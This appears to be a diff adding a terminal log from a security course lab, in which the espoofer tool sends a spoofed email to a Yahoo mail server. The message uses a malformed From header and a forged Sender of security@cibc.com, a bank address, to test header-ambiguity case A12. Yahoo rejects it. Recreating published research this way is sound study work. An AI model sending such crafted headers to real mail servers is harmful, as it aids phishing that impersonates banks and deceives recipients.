@@ -1,0 +1,54 @@
+(base) ➜  espoofer git:(client-mode-attack-recreation) ✗ python3 espoofer.py -id server_a12
+                               ____         
+  ___  _________  ____  ____  / __/__  _____
+ / _ \/ ___/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
+/  __(__  ) /_/ / /_/ / /_/ / __/  __/ /    
+\___/____/ .___/\____/\____/_/  \___/_/     
+        /_/                                 
+    
+Start sending emails...
+Connecting ('98.136.96.74', 25)
+>>> 220 mtaproxy211.free.mail.ne1.yahoo.com ESMTP ready
+
+<<< ehlo testdomaintest.company
+
+>>> 250-mtaproxy211.free.mail.ne1.yahoo.com
+250-PIPELINING
+250-SIZE 41943040
+250-8BITMIME
+250 STARTTLS
+
+<<< mail from: <any@testdomaintest.company>
+
+>>> 250 sender <any@testdomaintest.company> ok
+
+<<< rcpt to: <cis6510victim@yahoo.com>
+
+>>> 250 recipient <cis6510victim@yahoo.com> ok
+
+<<< data
+
+>>> 354 go ahead
+
+<<< From
+ : <first@testdomaintest.company>
+nTo: <cis6510victim@yahoo.com>
+Subject: A12: From and Sender header ambiguity
+Date: Tue, 24 Nov 2020 04:12:23 +0000
+Sender: <security@cibc.com>
+Content-Type: text/plain; charset="UTF-8"
+MIME-Version: 1.0
+Message-ID: <1538085644648.096e3d4e-bc38-4027-b57e-24F76R@message-ids.testdomaintest.company>
+X-Email-Client: https://github.com/chenjj/espoofer
+
+Hi, this is a test message! Best wishes.
+
+.
+
+>>> 554 Message not allowed - [299]
+
+<<< quit
+
+>>> 221 2.0.0 Bye
+
+Finished.
